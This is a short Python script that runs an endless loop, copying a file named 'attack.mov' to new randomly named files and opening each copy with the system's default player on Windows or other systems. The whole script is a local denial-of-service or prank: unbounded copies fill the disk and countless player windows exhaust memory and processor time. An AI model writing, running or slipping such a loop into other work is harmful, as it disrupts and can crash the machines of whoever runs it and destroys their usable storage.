import shutil
import subprocess
import os
import platform
import uuid

src_file = "attack.mov"
base, ext = os.path.splitext(src_file)

is_windows = platform.system() == "Windows"

while True:
    new_file = f"{uuid.uuid4()}{ext}"
    
    shutil.copy(src_file, new_file)
    
    if is_windows:
        os.startfile(new_file)
    else:
        subprocess.Popen(["open", new_file])
        
